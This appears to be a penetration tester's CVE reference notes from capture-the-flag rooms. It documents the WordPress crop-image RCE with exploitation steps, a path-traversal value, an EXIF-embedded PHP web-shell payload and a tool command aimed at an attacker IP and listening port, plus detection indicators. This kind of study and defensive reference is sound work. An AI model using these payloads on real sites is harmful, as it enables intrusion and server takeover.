# CVE Database

CVEs encountered during rooms and engagements. Growing reference.

---

## CVE-2019-8942 / CVE-2019-8943 — WordPress Crop-Image RCE

**Affected:** WordPress 5.0.0, WordPress <= 4.9.8
**Type:** Path traversal + Local file inclusion → RCE
**Required Access:** Author-level credentials
**CVSS:** 8.8

### How It Works

1. **Upload**: Authenticated user uploads a JPEG with PHP code embedded in EXIF/IPTC metadata
2. **Path Traversal**: Modify `_wp_attached_file` post meta to include traversal path (e.g., `2019/02/image.jpg?/../../../../themes/theme_name/shell`)
3. **Crop**: WordPress `crop-image` AJAX action creates a copy of the image at the traversed path, writing the PHP-laden JPEG into the theme directory
4. **LFI**: Create a new post with `_wp_page_template` set to the cropped image filename — WordPress includes it as a PHP template
5. **Execution**: Visiting the post triggers PHP execution via the EXIF payload (`<?= `$_GET[0]` ;?>`)

### Detection
- Unusual `_wp_attached_file` values containing `../` or `?/`
- JPEG files in theme directories
- Posts with `_wp_page_template` pointing to JPEG files

### Ghost Girl Tool
```bash
python3 tools/ghost-exploit.py wp_crop_rce \
  --RHOST target.thm \
  --USERNAME author_user \
  --PASSWORD password \
  --LHOST attacker_ip \
  --LPORT 4444
```

### Encountered
- **Blog** (TryHackMe, 2026-02-20): WordPress 5.0, user `kwheel`, used to gain initial shell as `www-data`

---

## Template — Adding New CVEs

```markdown
## CVE-YYYY-XXXXX — Short Description

**Affected:** Software and versions
**Type:** Vulnerability class
**Required Access:** What access level is needed
**CVSS:** Score

### How It Works
Step-by-step explanation.

### Detection
How to identify if a target is vulnerable.

### Exploit
Commands or tool reference.

### Encountered
- Room/engagement name, date, context
```
